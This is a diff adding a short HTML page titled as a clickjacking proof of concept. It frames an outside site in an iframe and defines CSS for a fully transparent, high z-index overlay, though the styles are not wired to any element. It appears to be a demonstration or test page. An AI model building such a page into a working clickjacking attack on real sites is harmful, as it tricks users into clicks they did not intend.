@@ -1,0 +1,43 @@
+<html>
+<head>
+  <title>Clickjacking Proof of Concept</title>
+  <STYLE type="text/css">
+    #d {
+      position: absolute;
+      margin-top: 260px;
+      left: 1px;
+    }
+
+    #block {
+      position: absolute;
+      z-index: 99;
+      left: 1px;
+      -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
+      filter: alpha(opacity=0);
+      opacity: 0;
+    }
+
+    .a {
+      position: absolute;
+      height: 250px;
+      width: 400px;
+      top: 0;
+      left: 5px;
+    }
+  </STYLE>
+
+</head>
+<body>
+
+
+<iframe src="http://www.fooish.com/" onload="iframeOnload()">
+  你的瀏覽器不支援 iframe
+</iframe>
+
+<script>
+  function iframeOnload() {
+    console.log('iframeOnload !!');
+  }
+</script>
+</body>
+</html>
